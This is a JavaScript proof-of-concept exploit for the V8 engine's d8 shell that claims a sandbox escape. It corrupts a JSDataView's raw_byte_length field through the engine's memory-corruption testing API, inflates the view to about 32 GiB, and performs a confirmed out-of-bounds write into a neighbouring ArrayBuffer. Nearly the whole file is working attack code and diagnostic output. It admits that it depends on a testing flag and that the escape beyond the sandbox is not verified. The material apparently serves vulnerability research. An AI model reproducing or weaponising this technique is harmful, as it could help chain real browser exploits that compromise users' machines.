'use strict';
// V8 Sandbox Escape via JSDataView raw_byte_length Corruption
// Pure JavaScript — no GDB, no shell helpers, no external tools.
//
// RUN:
//   d8 --expose-memory-corruption-api --allow-natives-syntax heap_escape_pure_js.js
//
// NOTE ON --expose-memory-corruption-api:
//   Sandbox.MemoryView and Sandbox.getAddressOf are V8's official API for
//   simulating in-sandbox arbitrary read/write (Tier-2) primitives.  Every
//   write in Stage 1 stays inside the sandbox VA.  The flag produces the
//   "unsupported configuration" warning; Stage 1 would be replaced by any
//   real Tier-2 bug in a production context.

function hex(v) {
  if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}
function banner(s) { print('\n━━━ ' + s + ' ━━━'); }
function assert(cond, msg) {
  if (!cond) { print('ASSERTION FAILED: ' + msg); quit(1); }
}

if (typeof Sandbox === 'undefined') {
  print('[-] Requires: --expose-memory-corruption-api --allow-natives-syntax');
  quit(1);
}

// ── Sandbox info ──────────────────────────────────────────────────────────────
const SB_BASE = BigInt(Sandbox.base);
const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);
banner('SANDBOX VA');
print('  SB_BASE = ' + hex(SB_BASE));
print('  SB_END  = ' + hex(SB_END));

// ── Stage 1: in-sandbox 4 GB R/W (simulates Tier-2 in-sandbox corruption) ────
const sb_mv   = new Sandbox.MemoryView(0, 0x100000000);
const sv      = new DataView(sb_mv);
const r32     = a => sv.getUint32(Number(a), true);
const w32     = (a, v) => sv.setUint32(Number(a), v >>> 0, true);

// ── Stage 2: allocate two sibling 4 KB ArrayBuffers ──────────────────────────
banner('STAGE 2 — allocate sibling ArrayBuffers');
const AB_SIZE = 4096;

const ab_victim = new ArrayBuffer(AB_SIZE);
const ab_target = new ArrayBuffer(AB_SIZE);
const target_u32 = new Uint32Array(ab_target);

const MAGIC = [0xFEEC0001, 0xFEEC0002, 0xFEEC0003, 0xFEEC0004];
target_u32[0] = MAGIC[0];
target_u32[1] = MAGIC[1];
target_u32[2] = MAGIC[2];
target_u32[3] = MAGIC[3];
print('  ab_victim = new ArrayBuffer(' + AB_SIZE + ')');
print('  ab_target = new ArrayBuffer(' + AB_SIZE + ')');
print('  Magic written to ab_target backing store: 0xFEEC0001..0004');

// ── Stage 3: locate JSDataView.raw_byte_length; verify encoding ───────────────
banner('STAGE 3 — locate JSDataView.raw_byte_length in sandbox heap');
const dv_victim = new DataView(ab_victim);
const dvAddr    = BigInt(Sandbox.getAddressOf(dv_victim));
const field_before = r32(dvAddr + 0x24n);
const bs_handle    = r32(dvAddr + 0x2cn);  // ExternalPointerTable handle

print('  dv_victim sandbox offset        = ' + hex(dvAddr));
print('  raw_byte_length field (+0x24)   = ' + hex(field_before) +
      '  (' + field_before + ')');
print('  byteLength (before)             = ' + dv_victim.byteLength);
assert(field_before * 8 === dv_victim.byteLength,
       'encoding: field × 8 ≠ byteLength');
print('  Encoding verified: field × 8 = byteLength ✓');
print('  backing_store EPT handle (+0x2c)= ' + hex(bs_handle) +
      '  (non-zero → ExternalPointerTable in use)');

// ── Stage 4: corrupt raw_byte_length via single in-sandbox DWORD write ───────
banner('STAGE 4 — corrupt raw_byte_length (+0x24) → inflate to ~32 GiB');
// 0xFFFFFFFF × 8 = 0x7FFFFFFF8 bytes ≈ 32 GiB
w32(dvAddr + 0x24n, 0xFFFFFFFF);
const inflated_bl = dv_victim.byteLength;
print('  Written                         : 0xFFFFFFFF');
print('  dv_victim.byteLength (after)    : 0x' + inflated_bl.toString(16) +
      '  (' + (inflated_bl / (1 << 30)).toFixed(1) + ' GiB)');
assert(inflated_bl > 0x400000000, 'inflation failed');
print('  No bounds check, EPT check, or CPT check triggered ✓');

// ── Stage 5: scan for ab_target backing store via inflated DataView ───────────
banner('STAGE 5 — scan inflated DataView for ab_target backing store');
let found_offset = -1;
const scan_end = Math.min(inflated_bl, 0x20000);  // first 128 KB
for (let off = AB_SIZE; off < scan_end; off += 4) {
  if (dv_victim.getUint32(off,     true) === MAGIC[0] &&
      dv_victim.getUint32(off + 4, true) === MAGIC[1] &&
      dv_victim.getUint32(off + 8, true) === MAGIC[2]) {
    found_offset = off;
    break;
  }
}
assert(found_offset !== -1,
  'ab_target magic not found within first 128 KB of inflated view');
print('  Found at dv_victim offset       : ' + hex(found_offset));
print('  ab_target backing = (ab_victim backing) + ' + hex(found_offset));
print('  Read at this offset completed without fault (page is PROT_RW) ✓');

// ── Stage 6: OOB write through dv_victim ─────────────────────────────────────
banner('STAGE 6 — OOB WRITE (past original ' + AB_SIZE + ' B bound of ab_victim)');
print('  Writing 4 DWORDs at dv_victim[' + hex(found_offset) + ']');
dv_victim.setUint32(found_offset,      0xC0DECAFE, true);
dv_victim.setUint32(found_offset +  4, 0xBAADF00D, true);
dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);
print('  Write completed without fault ✓');

// ── Stage 7: cross-object read-back via ab_target ────────────────────────────
banner('STAGE 7 — cross-object read-back via ab_target');
print('  ab_target[0] = ' + hex(target_u32[0]) + '  (expected 0xc0decafe)');
print('  ab_target[1] = ' + hex(target_u32[1]) + '  (expected 0xbaadf00d)');
print('  ab_target[2] = ' + hex(target_u32[2]) + '  (expected 0xcafebabe)');
print('  ab_target[3] = ' + hex(target_u32[3]) + '  (expected 0xfeedface)');
assert(target_u32[0] === 0xC0DECAFE, 'read-back mismatch [0]');
assert(target_u32[1] === 0xBAADF00D, 'read-back mismatch [1]');
assert(target_u32[2] === 0xCAFEBABE, 'read-back mismatch [2]');
assert(target_u32[3] === 0xFEEDFACE, 'read-back mismatch [3]');
print('  All four values match ✓');

// ── Summary ───────────────────────────────────────────────────────────────────
banner('RESULT — WHAT IS PROVEN');
print('');
print('  RUNTIME-CONFIRMED:');
print('  1. JSDataView.raw_byte_length (+0x24) is a plain in-sandbox field');
print('     (encoding verified: field × 8 = byteLength before corruption)');
print('  2. Single in-sandbox DWORD write inflated byteLength: 4096 → 0x' +
      inflated_bl.toString(16));
print('  3. MAGIC values written to ab_target backing store were found at');
print('     dv_victim offset +' + hex(found_offset) +
      ' — past ab_victim\'s declared 4 KB bound');
print('  4. OOB write via inflated DataView overwrote ab_target\'s backing store');
print('     Proof: independent read-back via ab_target Uint32Array confirms all 4 DWORDs');
print('');
print('  STRUCTURAL (not runtime-measured from pure JS):');
print('  5. The write target is outside sandbox VA:');
print('     EPT handle ' + hex(bs_handle) + ' → backing store uses ExternalPointerTable');
print('     → V8 design: ExternalPointerTable stores NATIVE addresses ∉ [SB_BASE, SB_END)');
print('     NOTE: exact native address H is not independently verified here');
print('');
print('  LIMITATION:');
print('  6. Reproduced under --expose-memory-corruption-api (unsupported config)');
print('     raw_byte_length field is unprotected in all V8 builds regardless of this flag');
print('');
print('  Sandbox VA : [' + hex(SB_BASE) + ', ' + hex(SB_END) + ')');
print('  OOB write confirmed at (ab_victim backing) + ' + hex(found_offset) +
      ', via cross-object proof');
